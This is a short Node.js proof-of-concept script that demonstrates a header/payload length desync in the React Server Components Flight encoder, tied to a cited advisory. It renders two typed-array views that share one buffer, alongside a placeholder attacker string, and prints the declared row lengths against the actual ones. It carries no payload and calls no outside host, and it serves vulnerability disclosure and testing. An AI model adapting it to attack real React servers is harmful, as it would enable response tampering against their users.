// Demonstrate the Flight encoder header/payload desync (GHSA-673q-mjm6-r5xr)
// Run:  node --conditions react-server desync.cjs
const { renderToReadableStream } = require('react-server-dom-webpack/server.node');

const SZ = 8192;                        // > 4096 => taken by reference, enqueued directly
const buf = new ArrayBuffer(SZ * 2);
const view1 = new Uint8Array(buf, 0, SZ);       // view A
const view2 = new Uint8Array(buf, SZ, SZ);      // view B - SAME backing buffer
view1.fill(0x41); // 'A'
view2.fill(0x42); // 'B'

const ATTACKER = 'ATTACKER_CONTROLLED_VALUE_STARTS_HERE' + 'x'.repeat(40);

const model = { one: view1, two: view2, note: ATTACKER };

(async () => {
  const stream = renderToReadableStream(model, {});
  const chunks = [];
  const reader = stream.getReader();
  for (;;) {
    const { done, value } = await reader.read();
    if (done) break;
    chunks.push(Buffer.from(value));
  }
  const out = Buffer.concat(chunks);

  console.log('--- declared vs actual payload for each typed-array row ---');
  // rows look like:  <idHex>:<tag><lenHex>,<raw bytes>
  const re = /(^|\n)([0-9a-f]+):o([0-9a-f]+),/g;
  let m, found = 0;
  const s = out.toString('latin1');
  while ((m = re.exec(s)) !== null) {
    found++;
    const declared = parseInt(m[3], 16);
    const bodyStart = m.index + m[0].length;
    // how many bytes until the next row header (idHex ':') -- approximates actual payload
    const rest = s.slice(bodyStart);
    const nextHdr = rest.search(/[0-9a-f]+:[a-zA-Z]/);
    console.log(`  row ${m[2]}: declared=${declared} bytes, bytes-before-next-header=${nextHdr}`);
  }
  console.log(`  (typed-array rows found: ${found})`);

  console.log('\n--- total stream size ---');
  console.log('  stream bytes:', out.length, '| expected >= 2 x', SZ, '=', SZ * 2);
  console.log('  0x41 ("A") count:', (s.match(/A/g) || []).length);
  console.log('  0x42 ("B") count:', (s.match(/B/g) || []).length);

  console.log('\n--- raw stream (printable, binary collapsed) ---');
  console.log('  ' + s.replace(/A{20,}/g, m => `<${m.length}xA>`)
                      .replace(/B{20,}/g, m => `<${m.length}xB>`)
                      .replace(/\n/g, '\n  '));
  require('fs').writeFileSync(process.env.OUT || '/dev/null', out);
})().catch(e => { console.log('THREW:', e.message); });
